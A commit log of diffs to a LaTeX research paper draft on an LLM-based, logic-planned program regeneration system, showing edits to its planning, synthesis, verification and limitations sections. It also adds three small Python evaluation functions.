+Without loss of generality, the text encompasses the four cases under $\mathsf{goal}$ and $\mathsf{do}$, explicitly mentioning the rest when there is an important semantic difference.
 
-Additionally, the system maximizes the number of enforced properties: % TODO: Explain why
+Additionally, the system maximizes the number of extracted properties:
 \[
-\text{maximize} \quad |\{ X \mid \mathsf{do}(X) \}|
+\text{maximize} \left|\left\{ X \mid \mathsf{do}(X) \right\}\right|
 \]
+Essentially, the planner tries to give the synthesizer as much information
+as possible, as long as none of the regeneration goals are violated.
 
-\paragraph{Plugin-Defined Rules.}
+\heading{Plugin-defined rules}
 Plugins contribute domain-specific inference rules and constraints. For example, a plugin for JavaScript-to-Haskell translation may define:
@@
 
-\paragraph{Axioms and Domain Knowledge.}
-The logic engine also supports domain-wide axioms. For example:
-\[
-\mathsf{do}(\texttt{language}(p, \texttt{haskell})) \Rightarrow \mathsf{do}(\texttt{pure}(p))
-\]
-This captures the assumption that programs written in Haskell are pure by default.
-Such axioms enrich the reasoning process and allow inferred properties to trigger downstream constraints or synthesis behaviors.
+\heading{Axioms and domain knowledge}
+The logic engine also includes domain-wide axioms based on some common assumptions.
+For example
+$\mathsf{do}(\texttt{language}(p, \texttt{haskell})) \Rightarrow \mathsf{do}(\texttt{pure}(p))$
+captures the assumption that programs written in Haskell are pure by default.
+Such axioms allow inferred properties to trigger downstream constraints or synthesis behaviors.
 
-\paragraph{Extensibility.}
-\sys’s property extraction is decentralized: plugins contribute $\mathsf{can}(\cdot)$ and reasoning rules, while the core planner resolves which properties to enforce based on goals, capabilities, and global constraints.
+\begin{listing}
+  \begin{minted}[frame=lines, fontsize=\small]{prolog}
+language(p, c).
+can(len(p)). % len plugin
+can(signature(p)). % signature plugin
+can(js2hs(p)). % js2hs plugin
+do(language(p, haskell)) :- do(js2hs(p)).
+:- do(js2hs(p)), not language(p, javascript).
+
+% Core solver logic
+:- do(language(p, X)), language(p, Y), X != Y,
+    not goal(language(p, X)).
+{ do(X) } :- can(X), not goal_min(X).
+{ do_min(X) } :- can(X).
+ndo(N) :- N = #count { X : do(X) }.
+#maximize { N : ndo(N) }.
+:- goal(X), not do(X).
+:- goal_min(X), not do_min(X).
+:- do(language(P, L1)), do(language(P, L2)), L1 != L2.
+
+goal_min(len(p)). % User query
+\end{minted}
+  \caption{\textbf{Example \sys logic program.}
+  This is a lightly simplified version of the logic program that produces the plan for the idiomatization task~(\cref{sec:example}). 
+  The program contains facts coming from (1) the input program (it is written in C),
+  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{js2hs}),
+  (3) axioms from the logic engine (\eg a program can have one language, an analysis will be applied only if possible, all goals must be satisfied), and
+  (4) the user query (the user wants to minimize the length of the program).
+  }
+  \label{lst:logic-example}
+\end{listing}
+
+\heading{Extensibility}
+\sys's property extraction is decentralized: plugins contribute $\mathsf{can}(\cdot)$ facts, and pre- and post-conditions, while the core planner resolves which properties to enforce based on goals, capabilities, and axioms.
 This modularity allows language-specific analyses to coexist with general-purpose reasoning in a unified planning layer.
-
-By treating properties as planning primitives, \sys unifies static analysis, user intent, and regeneration constraints in a common symbolic framework.
-This design enables precise and interpretable control over the regeneration process.
 
@@
 
-\sys performs regeneration through a structured synthesis plan that combines symbolic reasoning over program properties with targeted, language-model-guided code generation.
-The system is designed to support small-scale regeneration tasks—typically at the level of individual functions—where precision and control are critical.
-By focusing on localized rewrites rather than wholesale program replacement, \sys enables composable transformations that scale across large codebases when applied judiciously.
-
-\paragraph{From Properties to Plan.}
-The synthesis process begins with a set of enforced properties $\{ X \mid \mathsf{do}(X) \}$ selected by the planner (§\ref{sec:property-language}).
+The synthesis process begins with a set of enforced properties $\{ X \mid \mathsf{do}(X) \}$ selected by the planner (\cref{sec:dsl}).
 These properties reflect both user goals (e.g., removing side effects, translating to a different language) and structural characteristics of the input program that should be preserved.
@@
 \end{itemize}
-These constraints are scoped to the transformation unit and inform the synthesis phase directly.
+% These constraints are scoped to the transformation unit and inform the synthesis phase directly.
 
-\paragraph{LLM-Guided Regeneration.}
-Each synthesis task is delegated to a language model guided by a structured prompt.
-The prompt is constructed by composing fragments contributed by active plugins, each of which has access to the current plan and can contribute natural language or code examples relevant to its domain.
+\heading{LLM-guided regeneration}
+The synthesis task is delegated to a language model guided by a structured prompt.
+The prompt is constructed by composing fragments contributed by plugins that are part of the regeneration plan, each of which can contribute natural language instructions relevant to its domain.
 For example:
 \begin{itemize}
-  \item A signature plugin may contribute: \emph{“The output should implement a function \texttt{normalize(str: string): string}.”}
-  \item A purity plugin may add: \emph{“Avoid all side effects, including file system or network operations.”}
-  \item A language plugin may prepend: \emph{“Translate this JavaScript function into idiomatic Haskell.”}
+  \item A signature plugin may contribute: \emph{\say{The output should implement a function \texttt{sqrt(n: float): float}.}}
+  \item A length plugin combined with a minimization goal may prepend: \emph{\say{The output should be as short as possible while preserving the original functionality.}}
+  \item A language plugin may prepend: \emph{\say{The output function should be written in Haskell.}}
 \end{itemize}
 
-These fragments are combined with a representation of the input function—possibly abstracted to suppress undesirable behavior—and submitted to the LLM as a constrained regeneration task.
+These fragments are combined with a normalized text representations of each of 
+the extracted properties.
 
-\paragraph{Locality and Compositionality.}
-The emphasis on function-level regeneration serves two purposes.
-First, it limits the scope of transformation, reducing the risk of unintended behavioral changes.
-Second, it enables \sys to reuse synthesized components across broader program contexts, composing regenerated units into a coherent whole.
-This design supports partial regeneration: some functions may be left unchanged, others regenerated under different plans.
+\heading{Constraint-guided generation}
+While \sys delegates code synthesis to a large language model, the planner constrains the generation space in two key ways.
+First, the prompt is constructed to admit only transformations that are valid under the current plan.
+For instance, if the target function must be pure, the prompt will exclude information such as system-call traces that might imply side-effectful behavior.
+Second, candidate outputs are verified post hoc against the enforced properties~(\cref{sec:verification}); if verification fails, the result is either rejected or used to revise the current plan.
+% This hybrid model balances flexibility with rigor: the LLM provides diversity and fluency, while the planner ensures adherence to property-based constraints.
 
-\paragraph{Constraint-Guided Generation.}
-While synthesis is delegated to an LLM, the planner constrains the generation space in two key ways:
-\begin{enumerate}
-  \item The prompt reflects only valid transformations under the current plan.
-  \item Candidate outputs are verified post hoc against the enforced properties (§\ref{sec:verification}), and failures result in rejection or plan revision.
-\end{enumerate}
-This hybrid model balances flexibility with rigor: the LLM provides diversity and fluency, while the planner ensures adherence to property-based constraints.
-
-\paragraph{Incremental and Adaptive Planning.}
-If a candidate program fails verification, \sys does not blindly retry.
-Instead, it may refine the plan: relaxing soft constraints, prioritizing alternatives, or invoking different plugin strategies.
-This incremental approach avoids overfitting to invalid candidates and supports fallback mechanisms when regeneration proves difficult.
-
-In sum, the synthesis plan acts as a structured contract between logical property reasoning and generative synthesis.
+% In sum, the synthesis plan acts as a structured contract between logical property reasoning and generative synthesis.
 By operating at a localized level and under clearly scoped constraints, \sys delivers regenerations that are both controlled and scalable—when applied thoughtfully and systematically.
@@
 To validate that a regenerated program satisfies the intended goals, \sys includes an explicit verification phase that checks whether the output adheres to the enforced properties in the synthesis plan.
-Verification serves as a structural filter: it accepts only those candidates that meet the plan’s constraints and provides feedback for refining or retrying those that do not.
+Verification accepts only programs that meet the plan's constraints and provides feedback for refining or retrying those that do not.
 
-\paragraph{Verification as Property Checking.}
+\heading{Verification as property checking}
 After synthesis, \sys invokes a set of property-specific checkers.
@@
   \item For $\mathsf{do}(\texttt{no\_network}(f))$, the checker confirms the absence of known network APIs or imports.
-  \item For $\mathsf{do}(\texttt{signature}(f))$, the checker matches the regenerated function’s name, parameters, and arity against the extracted signature.
+  \item For $\mathsf{do}(\texttt{signature}(f))$, the checker matches the regenerated function's name, parameters, and arity against the extracted signature.
   \item For $\mathsf{do}(\texttt{pure}(f))$, the checker examines control flow and side-effecting operations to detect possible violations.
@@
 Checkers are modular and contributed by plugins. Their combined results determine whether a candidate is considered valid under the current plan.
+For minimization and maximization goals, the verification phase uses the less-than or greater-than operators as are defined internally by the plugin verifying the given property.
+Verfication in this case checks if the property's value has decreased or increased compared 
+to the previous regeneration attempt. If the value remains unchanged for two consecutive attempts, its considered satisfied.
 
-\paragraph{Failure-Driven Refinement.}
+\heading{Failure-driven refinement}
 When a candidate fails verification, \sys treats this as a feedback signal.
@@
   \item \emph{Retrying synthesis}: A fresh LLM call with the same plan but a different generation path.
-  \item \emph{Adjusting the plan}: Relaxing soft constraints or reordering plugin hooks to prioritize more tractable properties.
+  \item \emph{Feedback loop}: \sys will provide the previous regeneration attempt 
+    as an additional context to the LLM, together with with an explanation of the properties that were violated, prompting it to adapt its output based on prior failures.
+    This mode is only activated if the verifier knows that the output will not to taint
+    followupp regeneration attempts.
   \item \emph{Fallback handling}: If a function repeatedly fails validation, \sys may leave the original version intact or mark it for manual inspection.
@@
 
-This loop provides adaptability: regeneration is not expected to succeed unconditionally, but rather to proceed incrementally under interpretable, bounded failure modes.
+% This loop provides adaptability: regeneration is not expected to succeed unconditionally, but rather to proceed incrementally under interpretable, bounded failure modes.
 
-\paragraph{Partial Regeneration and Composition.}
+\heading{Partial regeneration and composition}
 \sys supports regeneration at the granularity of individual functions.
@@
 The output program thus consists of a composition of validated regenerated units and untouched originals.
+This model supports application in real-world codebases, where partial improvement (\eg replacing unsafe or deprecated functions) can be meaningful even without complete coverage.
 
-This model supports practical application in real-world codebases, where partial improvement (e.g., replacing unsafe or deprecated functions) can be meaningful even without complete coverage.
-
-\paragraph{Iterative, Property-Preserving Generation.}
-The synthesis-verification loop respects the symbolic contract defined in the planning phase.
+% \heading{Iterative, property-preserving generation}
+% The synthesis-verification loop respects the symbolic contract defined in the planning phase.
 At each iteration, the system attempts to generate a program fragment that satisfies the active $\mathsf{do}(\cdot)$ properties.
@@
 
-The verifier interface is designed for extensibility: new properties can introduce new checkers without modifying the core regeneration pipeline.
+% The verifier interface is designed for extensibility: new properties can introduce new checkers without modifying the core regeneration pipeline.
 
-\paragraph{Behavioral Guarantees.}
-\sys does not aim to replicate the full semantics of the input program.
+% \heading{Behavioral guarantees}
+% \sys does not aim to replicate the full semantics of the input program.
 Instead, it focuses on regenerating code that conforms to a declarative set of constraints.
@@
 
-This contract-driven model supports safe, localized rewrites in domains where correctness, compatibility, or safety properties must be preserved with high confidence, even in the presence of imperfect generative models.
+% This contract-driven model supports safe, localized rewrites in domains where correctness, compatibility, or safety properties must be preserved with high confidence, even in the presence of imperfect generative models.
 
@@
 \section{Evaluation}
+\label{sec:evaluation}
 
@@
   \centering
-  \caption{Correctness: Percentage of tasks passing all I/O tests.}
+  \caption{Correctness: Percentage of tasks passing all I/O tests}
   \begin{tabular}{lc}
@@
 
-\heading{Program Synthesis}
+\heading{Program synthesis}
 Program synthesis research spans a rich space of techniques.
@@
 
-\heading{Program Transformations and Refactoring}
+\heading{Program transformations and refactoring}
 The evolution and maintenance of software systems often involve transformations
@@
 
-\heading{Logic Programming and Constraint Solving}
+\heading{Logic programming and constraint solving}
 Logic programming has long served as a foundation for reasoning in programming
@@
 Its strength lies in combining symbolic reasoning and generative synthesis in a modular and interpretable framework.
-However, this design comes with inherent tradeoffs, which we discuss below.
+However, this design comes with inherent tradeoffs, which are discussed below.
 
-\paragraph{Scope of Regeneration.}
-\sys is not intended for whole-program synthesis or full language migration.
-It operates most effectively when applied to localized program units—such as individual functions, methods, or modules—where the intended behavior is reasonably self-contained and describable via explicit properties.
-Applying \sys to larger-scale transformations may yield incomplete results, or expose coordination challenges not addressed by the current system.
+\heading{Targeted regeneration}
+\sys is designed as a surgical tool for targeted regeneration tasks, not for whole-program synthesis or full language migration.
+It operates most effectively on localized units of code—such as individual functions, methods, or small modules, where behavior is self-contained and transformation goals can be expressed through explicit constraints.
+% Typical applications include rewriting high-risk, deprecated, or poorly understood code segments where correctness is critical and semantic preservation is essential.
+Broad, untargeted use may yield incomplete results and can be bottlenecked by the limited context of the back-end model \sys uses.
 
-\paragraph{Dependence on Property Specification.}
+\heading{Dependence on property specification}
 The system relies heavily on the quality and granularity of extracted or declared properties.
 In cases where desired behaviors cannot be easily expressed using available predicates, or where plugins fail to extract meaningful constraints, the regeneration plan may be under-constrained, leading to brittle or incorrect outputs.
-The framework is extensible, but each new property class requires new reasoning rules, extractors, and verifiers.
+The framework is extensible, but each new property class requires the development of a new plugin that will provide a set of pre- and post-conditions, an extractor, and a verifier.
 
-\paragraph{Trust Model and Correctness.}
+\heading{Trust model and correctness}
 \sys does not provide formal guarantees of semantic equivalence to the original program.
 Instead, correctness is defined relative to a set of enforced properties.
-This means that correctness is only as strong as the property definitions and associated checkers.
-In the presence of underspecified or unverifiable goals, regenerated code may exhibit unanticipated behavior—even if it passes all checks.
+This means that correctness is only as strong as the property definitions and associated verifiers.
+In the presence of underspecified or unverifiable goals, regenerated code may exhibit unanticipated behavior, even if it passes all checks.
 
-\paragraph{LLM Limitations.}
+\heading{LLM limitations}
 The generative synthesis phase is subject to the inherent variability and failure modes of large language models.
 These include hallucinations, sensitivity to prompt phrasing, and inconsistency under minor input changes.
-While \sys mitigates these risks through constraint-based planning and post-hoc verification, it cannot eliminate them entirely.
-In cases where no satisfactory candidate is found, regeneration may fail or require manual intervention.
+While \sys mitigates many of these risks through planning and post-hoc verification, it cannot eliminate them entirely.
+In cases where no satisfactory candidate is found, regeneration may fail and require manual intervention.
 
-\paragraph{Language-Specific Support.}
-Although some components of \sys are language-agnostic (e.g., logic-based planning), others—particularly extraction and verification plugins—are not.
+\heading{Language-specific support}
+Although some components of \sys are language-agnostic (\eg logic-based planning), others—particularly extraction and verification plugins are not.
 Supporting a new language requires implementing language-specific analyzers and constraints.
 This modularity is deliberate, but it does limit out-of-the-box generality.
+The current \sys prototype supports Python, JavaScript, Haskell, and C.
 
-\paragraph{Strategic Application.}
-In practice, \sys is best used as a surgical tool: to rewrite high-risk, deprecated, or poorly understood code under explicit constraints.
-Its effectiveness comes from focusing effort on narrow slices of functionality where correctness matters and regeneration goals are clear.
-Broad, untargeted application is unlikely to yield high-quality results.
+\heading{Future directions}
+Several extensions could improve \sys's capabilities.
+These include richer property languages (\eg temporal or dataflow properties), tighter integration with formal verification tools, and cross-component reasoning for coordinated rewrites.
+Additionally, integrating counterfactual generation techniques~\cite{Cabalar_2020} could help explain why certain regeneration goals are infeasible or conflicting.
 
-\paragraph{Future Directions.}
-Several extensions could improve \sys’s capabilities.
-These include richer property languages (e.g., temporal or dataflow properties), tighter integration with formal verification tools, learning-guided property extraction, and cross-component reasoning for coordinated rewrites.
-Additionally, integrating counterfactual generation techniques could help explain why certain regeneration goals are infeasible or conflicting.
-
-Overall, \sys offers a flexible framework for controlled regeneration, but its effectiveness depends on the specificity of goals, the availability of property logic, and the scope of the transformation task.
+% Overall, \sys offers a flexible framework for controlled regeneration, but its effectiveness depends on the specificity of goals, the availability of property logic, and the scope of the transformation task.
 Its design favors composability and clarity over full automation, aiming to serve as a building block in broader refactoring, auditing, or hardening pipelines.

### 2025-06-14 eval/pypi/left_pad.py
Add pypi packages
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,2 @@
+def left_pad(s, n, c):
+    return s.rjust(len(s) + n, c)

### 2025-06-14 eval/pypi/sliced.py

@@ -1,0 +1,4 @@
+def sliced(lst, n):
+    '''Yield n number of slices from lst.'''
+    # Original algorithm from Jurgen Strydom posted 2019-02-21 Stack Overflow
+    # https://stackoverf

### 2025-06-14 eval/pypi/unique.py

@@ -1,0 +1,3 @@
+def unique(lst):
+    '''Take list "lst" and return a version without duplicates.'''
+    return list(set(lst))

### 2025-06-14 paper/draft.tex
Add cross-language citations
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Improvements in intro
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \end{abstract}
-
-% Given a source program and a declarative user query $f(P, P')$,
-% \sys orchestrates a property-guided regeneration process.
-% Adapters extract relevant properties from the original program
-% using pluggable analyzers,
-% which may be language-agnostic (\eg I/O tracing)
-% or language-specific (\eg AST parsing),
-% and may require execution environments (\eg sandboxing).
-% The logic engine formulates a minimum-satisfiability (MinSAT) problem
-% over the property space using a plugin-extensible knowledge base that encodes
-% compatibility constraints (\eg which transformations preserve purity, which
-% properties can be reused across languages).
-% The synthesis engine uses these extracted properties to generate candidate
-% programs, which are verified by verifier plugins.
-% The result is a program $P'$ that satisfies the user's transformation goal
-% while preserving required behaviors of the original program.
-
 \maketitle
@@
 
-% TODO: Introduce LLMs around here
-Recent advances in large language models (LLMs) have opened new possibilities for automating code transformation tasks.
+Recent advances in large language models (LLMs) have opened new possibilities for automating program transformation and synthesis tasks, making them attractive tools for software evolution, albeit with caveats.
+This flexibility has positioned them as attractive tools for software evolution.
 LLMs can translate code across languages~\cite{ou2025enhancingllmbasedcodetranslation},
@@
 and even generate entire components from scratch~\cite{huynh2025largelanguagemodelscode}.
-This flexibility has positioned them as attractive tools for software evolution.
-However, their outputs are shaped by surface-level patterns in the input~\cite{yang2025evaluatinggeneralizationcapabilitieslarge}.
-They struggle with negative constraints (\eg \say{do not use this interface}), often overfit to spurious input cues, and lack mechanisms for enforcing precise behavioral properties on the generated code~\cite{xu2023llmfoolitselfpromptbased, wu2023deceptpromptexploitingllmdrivencode,jiang2024llmsdreamelephantswhen,hwang2024thinkpinkelephant,roh2025breakthechainreasoningfailuresllms}.
-As a result, while LLMs can accelerate prototyping, developers remain unable to reliably steer or verify their correctness.
+However, their outputs are shaped by surface-level patterns in the input~\cite{yang2025evaluatinggeneralizationcapabilitieslarge},
+they struggle with negative constraints~\cite{hwang2024thinkpinkelephant,jiang2024llmsdreamelephantswhen},
+often overfit to spurious input cues~\cite{xu2023llmfoolitselfpromptbased, wu2023deceptpromptexploitingllmdrivencode},
+and lack mechanisms for enforcing precise behavioral properties on the generated code~\cite{roh2025breakthechainreasoningfailuresllms}.
+As a result, developers must prompt and steer them through brittle heuristics or manual trial-and-error, leading to workflows that are difficult to audit, integrate, or systematically reason about.
+Bridging this gap calls for a declarative interface---one that allows developers to specify explicit semantic constraints and transformation goals, and to reason about their satisfaction in a principled way.
 
@@
 %    acceptance
-
-Despite their power, LLMs and associated tooling remain fundamentally
-procedural and ad hoc: developers must prompt and steer them indirectly, often
-relying on brittle heuristics or manual trial-and-error to align outputs with
-intent.
-This process is brittle, hard to audit, and difficult to integrate into systematic workflows.
-Bridging this gap calls for a declarative interface for transformation, one that allows explicit semantic constraints and transformation goals, and supports reasoning about their satisfaction.
 
@@
 It can also assist during development, for instance when integrating third-party modules that must be adapted to local conventions or hardened against security vulnerabilities.
-In each case, \sys serves as a tool for localized, correctness-sensitive transformations with minimal disruption to surrounding logic.
 However, \sys is not designed for whole-program synthesis or large-scale migrations.
-Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module—where transformation goals can be explicitly stated and verified in isolation.
+Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module---where transformation goals can be explicitly stated and verified in isolation.
+To this end, \sys is designed not only as a standalone tool but also as a library component within larger, compound AI systems~\cite{compound-ai-blog}, where it can be invoked as a programmable, constraint-guided regeneration module.
 
@@
 
-For instance, a plan for regenerating a specific function might include:
-\begin{itemize}
-  \item $\mathsf{do}(\texttt{language}(f, \texttt{haskell}))$ — the function must be rewritten in Haskell,
-  \item $\mathsf{do}(\texttt{pure}(f))$ — the function must be side-effect-free,
-  \item $\mathsf{do}(\texttt{signature}(f))$ — the original function signature must be preserved.
-\end{itemize}
+For instance, a plan for regenerating a specific function $f$ might include:
+\(\mathsf{do}(\texttt{language}(f, \texttt{haskell}))\) the function must be written in Haskell, 
+\(\mathsf{do}(\texttt{pure}(f))\) the function must be side-effect-free, and 
+\(\mathsf{do}(\texttt{signature}(f))\) the function signature must be preserved.
 % These constraints are scoped to the transformation unit and inform the synthesis phase directly.
@@
 \begin{itemize}
-  \item A signature plugin may contribute: \emph{\say{The output should implement a function \texttt{sqrt(n: float): float}.}}
-  \item A length plugin combined with a minimization goal may prepend: \emph{\say{The output should be as short as possible while preserving the original functionality.}}
-  \item A language plugin may prepend: \emph{\say{The output function should be written in Haskell.}}
+  \item A \ttt{signature} plugin may contribute: \emph{\say{The output should implement a function \texttt{sqrt(n: float): float}.}}
+  \item A \ttt{length} plugin combined with a minimization goal may prepend: \emph{\say{The output should be as short as possible while preserving the original functionality.}}
+  \item A \ttt{javascript2haskell} plugin may prepend: \emph{\say{The output function should be written in Haskell.}}
 \end{itemize}
@@
 % In sum, the synthesis plan acts as a structured contract between logical property reasoning and generative synthesis.
-By operating at a localized level and under clearly scoped constraints, \sys delivers regenerations that are both controlled and scalable—when applied thoughtfully and systematically.
+By operating at a localized level and under clearly scoped constraints, \sys delivers regenerations that are both controlled and scalable---when applied thoughtfully and systematically.
 
@@
 Each checker is responsible for evaluating whether a property $X$ in $\mathsf{do}(X)$ holds for the regenerated program fragment.
-These checkers operate at varying levels of precision—ranging from structural pattern checks to light static or symbolic analysis—and are tailored to the property type.
+These checkers operate at varying levels of precision---ranging from structural pattern checks to light static or symbolic analysis---and are tailored to the property type.
 
@@
 \sys is designed as a surgical tool for targeted regeneration tasks, not for whole-program synthesis or full language migration.
-It operates most effectively on localized units of code—such as individual functions, methods, or small modules, where behavior is self-contained and transformation goals can be expressed through explicit constraints.
+It operates most effectively on localized units of code---such as individual functions, methods, or small modules, where behavior is self-contained and transformation goals can be expressed through explicit constraints.
 % Typical applications include rewriting high-risk, deprecated, or poorly understood code segments where correctness is critical and semantic preservation is essential.
@@
 \heading{Language-specific support}
-Although some components of \sys are language-agnostic (\eg logic-based planning), others—particularly extraction and verification plugins are not.
-Supporting a new language requires implementing language-specific analyzers and constraints.
-This modularity is deliberate, but it does limit out-of-the-box generality.
+Although some components of \sys are language-agnostic (\eg logic-based planning), others---particularly extraction and verification plugins are not.
+Supporting a new language requires implementing language-specific analyzers and constraints. This modularity is deliberate, but it does limit out-of-the-box generality.
+Work on a unified language representation~\cite{koppel2018onetool,bap2011,dillig2009sail}, is relevant to overcomming this limitation.
 The current \sys prototype supports Python, JavaScript, Haskell, and C.

### 2025-06-15 paper/draft.tex
Fix dup word
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
   \item \emph{Feedback loop}: \sys will provide the previous regeneration attempt 
-    as an additional context to the LLM, together with with an explanation of the properties that were violated, prompting it to adapt its output based on prior failures.
+    as an additional context to the LLM, together with an explanation of the properties that were violated, prompting it to adapt its output based on prior failures.
     This mode is only activated if the verifier knows that the output will not to taint

### 2025-06-15 paper/draft.tex
Fix weasel and passive voice
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-% \sys is a framework for regenerating programs.
-% \sys accepts a variety of wanted program properties that should be preserved after regeneration.
-% \sys also takes a set of guiding properties that will be given as input to the regeneration component.
-% Then, \sys will regenerate the program to satisfy the wanted properties while preserving the guiding properties.
-% \sys can be used for source to source transformation, program repair, (original code can be: insecure, slow, proprietary, wrong, bad context, different language, non-idiomatic).
-% \sys uses a plugin architecture that allows extending it with program property extractors (IO pairs, CFG, AST, execution traces, execution time, etc.).
-% The regeneration component can be extended with different regeneration algorithms (e.g., genetic programming, symbolic execution, LLM, etc.).
-
 % Use cases for something like this include:
@@
   It then synthesizes a new program $P'$ that satisfies the query, verifying
-  that wanted properties are preserved and unwanted properties are avoided.
+  that wanted properties are present and unwanted properties are absent in $P'$.
 }
@@
 and even generate entire components from scratch~\cite{huynh2025largelanguagemodelscode}.
-However, their outputs are shaped by surface-level patterns in the input~\cite{yang2025evaluatinggeneralizationcapabilitieslarge},
+However, surface-level patterns in the input shape their outputs~\cite{yang2025evaluatinggeneralizationcapabilitieslarge},
 they struggle with negative constraints~\cite{hwang2024thinkpinkelephant,jiang2024llmsdreamelephantswhen},
@@
 
-The design of \sys is shaped by three key insights.
+Three key insights shape the design of \sys.
 First, modern software is highly modular, making it feasible to reason about transformations at the granularity of individual components or functions.
 Second, the program regeneration setting provides a unique advantage: the original program serves as a concrete ground-truth, enabling semantic comparisons and verification of the transformed output, something impossible in traditional synthesis tasks.
-Third, the underlying synthesis technology---particularly LLMs---is evolving rapidly; a declarative interface allows this progress to be harnessed without disrupting the framework's end user.
+Third, the underlying synthesis technology---particularly LLMs---is evolving rapidly; a declarative interface that harnesses this progress without disrupting the framework's end user.
 
@@
 \heading{Deployment scenarios and limitations}
-\sys can be deployed at various points in the software lifecycle.
+\sys supports a range of deployment scenarios.
 It is particularly well-suited for use during maintenance and auditing phases, where developers seek to refactor or replace components, especially when the original code is difficult to understand, modify, or is unavailable and the component exists only as a binary.
@@
 Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module---where transformation goals can be explicitly stated and verified in isolation.
-To this end, \sys is designed not only as a standalone tool but also as a library component within larger, compound AI systems~\cite{compound-ai-blog}, where it can be invoked as a programmable, constraint-guided regeneration module.
+To this end, \sys functions not only as a standalone tool but also as a
+library, where other components can invoke it as a programmable,
+constraint-guided regeneration module.
 
@@
 
-\sys is evaluated across a diverse set of transformation tasks~(\cref{sec:evaluation}), including:
+We evaluate \sys across a diverse set of transformation tasks~(\cref{sec:evaluation}), including:
 	security hardening, by stripping latent malicious behavior while preserving intended functionality;
@@
 \sys enables users to specify transformation goals declaratively.
-These goals are expressed as logical constraints over properties of the
-regenerated program, such as input-output equivalence, side-effect elimination,
+Logical constraints over properties of the
+regenerated program express these goals. Examples are input-output equivalence, side-effect elimination,
 target language, lines of code, and others.
@@
 a new program that satisfies the query.
-This process is cast as a
+\sys casts this process as a
 maximum-satisfiability (MaxSAT) problem~\cite{sung2006maximum}, optimizing for the smallest extraction
@@
 
-This section goes through several examples applying \sys
+This section shows the application of \sys
 to three distinct program transformation tasks, 
@@
 global state under specific conditions.
-Program regeneration can be used to automatically remove possible malicious payloads
+Program regeneration can automatically remove possible malicious payloads
 while preserving the original program's observable behavior,
 especially in this scenario, where the attack is highly obfuscated and 
-activates under very precise conditions~\cite{harp:ccs:2021}.
+activates under precise conditions~\cite{harp:ccs:2021}.
 \begin{minted}[frame=lines]{js}
@@
 \end{wrapfigure}
-A program written in the \sys DSL to express this intent is shown.
+To the right is a program written in the \sys DSL to express this intent.
 This query requires the regenerated program \ttt{P_} to exhibit the same I/O behavior,
@@
 
-Building on the same source, \sys can be used for cross-language
+Building on the same source, \sys can perform cross-language
 translation. 
@@
 on a set of generated inputs.
-In this case, where it is instructed to optimize an aspect of the program, \sys will re-prompt
-the model to regenerate the program until no improvements are made or there is a negligible difference after two consecutive iterations.
+In this case, where the goal is to optimize an aspect of the program, \sys will re-prompt
+the model to regenerate the program until it can make no improvements or there is a negligible difference after two consecutive iterations.
 After \xxx seconds, and \xxx iterations, \sys produces the following program:
@@
 \end{wrapfigure}
-\sys, given the query to the right, is instructed 
-to generate program that consists of two functions,
+\sys, given the query to the right, will 
+generate program that consists of two functions,
 whose composition is equivalent to the original program, and feature 
@@
 Essentially, these describe what needs to hold for an analysis to be applicable to the given 
-program and what properties will be preserved or transformed after regeneration.
-Then, one or more user-provided regeneration goals (termed as the query), are passed to the planning component.
-The full set of rules and predicates are used to construct an ASP program,
-which is passed into a solver.
+program and what properties \sys will preserve or transform after regeneration.
+Then, the planning component accepts one or more user-provided regeneration goals (termed as the query).
+The full set of rules and predicates are used to construct an ASP program
+a solver then accepts.
 From the solver's output, the planner constructs a plan that specifies which
-analysies should be applied to the input program and what properties can be
+analysies \sys plugins should apply to the input program and what properties can be
 preserved during regeneration in order to fullfill the query.
@@
 While some properties are derived from generic analyses
-applicable across languages~(\eg examples of input-output behavior), others are tailored to the specifics of the input program's language and runtime model.
+applicable across languages~(\eg examples of input-output behavior), others are specific to the input program's language and runtime model.
 
@@
 failure as a signal to refine the plan or resample the synthesis step.
-This forms a feedback loop: planning, synthesis, and verification interact until a
-satisfactory program is produced or the system exhausts its search.
+This forms a feedback loop: planning, synthesis, and verification interact until \sys
+produces a satisfactory program or the system exhausts its search.
 
@@
 \heading{Property predicates}
-Each property is represented as a logical predicate over the program symbol $p$. Common examples include:
+Each property is a logical predicate over the program symbol $p$. Common examples include:
 \begin{itemize}
@@
 
-Properties are classified into three categories:
+Properties fall into three categories:
 \begin{itemize}
-  \item $\mathsf{goal}(X)$: the user requires $X$ to hold in the regenerated program. Such facts are derived from the user query.
-  \item $\mathsf{can}(X)$: the system is capable of extracting or inferring property $X$ from the input. These facts are added by plugins and represent the system's capabilities.
-  \item $\mathsf{do}(X)$: $X$ is selected for enforcement and will be preserved or regenerated.
-The logic engine determines which properties to enforce based on the user query and the system's capabilities.
+  \item $\mathsf{goal}(X)$: the user requires $X$ to hold in the regenerated program. The system derives such facts from the user query.
+  \item $\mathsf{can}(X)$: the system is capable of extracting or inferring property $X$ from the input. Plugins add these facts and represent the system's capabilities.
+  \item $\mathsf{do}(X)$: $X$ the planner selects $X$ for enforcement and the synthesizer will preserve or regenerate it. 
 \end{itemize}
@@
 \begin{align*}
-  \mathsf{goal}(X) &\Rightarrow \mathsf{do}(X) &\text{Goals must be satisfied} \\
+  \mathsf{goal}(X) &\Rightarrow \mathsf{do}(X) &\text{Satisfy all goals} \\
   \mathsf{do}(X) &\Leftarrow \mathsf{can}(X) &\text{Apply only extractable properties}
 \end{align*}
-\sys also supports minimization, maximization and elimination of properties.
-These are supported through the $\mathsf{goal\_min}$, $\mathsf{goal\_max}$, and $\mathsf{goal\_not}$ and the corresponding $\mathsf{do\_min}$, $\mathsf{do\_max}$, and $\mathsf{do\_not}$ predicates.
+\sys also supports minimization, maximization and elimination of properties
+through the $\mathsf{goal\_min}$, $\mathsf{goal\_max}$, and $\mathsf{goal\_not}$ and the corresponding $\mathsf{do\_min}$, $\mathsf{do\_max}$, and $\mathsf{do\_not}$ predicates.
 Without loss of generality, the text encompasses the four cases under $\mathsf{goal}$ and $\mathsf{do}$, explicitly mentioning the rest when there is an important semantic difference.
@@
